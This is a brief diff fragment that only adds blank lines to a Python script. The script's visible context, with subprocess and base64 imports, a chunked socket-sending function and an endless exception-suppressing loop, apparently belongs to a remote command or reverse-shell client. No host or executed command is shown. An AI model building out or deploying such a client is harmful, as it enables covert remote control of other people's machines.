@@ -57,6 +57,7 @@ from contextlib import suppress
 from subprocess import run, PIPE
 from base64 import b64decode, b64encode
 
+
 def sendall(data):
     chunk = data[:30000]
     data = data[30000:]
@@ -64,6 +65,7 @@ def sendall(data):
         s.sendall(chunk)
         chunk = data[:30000]
         data = data[30000:]
+
 
 while True:
     with suppress(Exception):
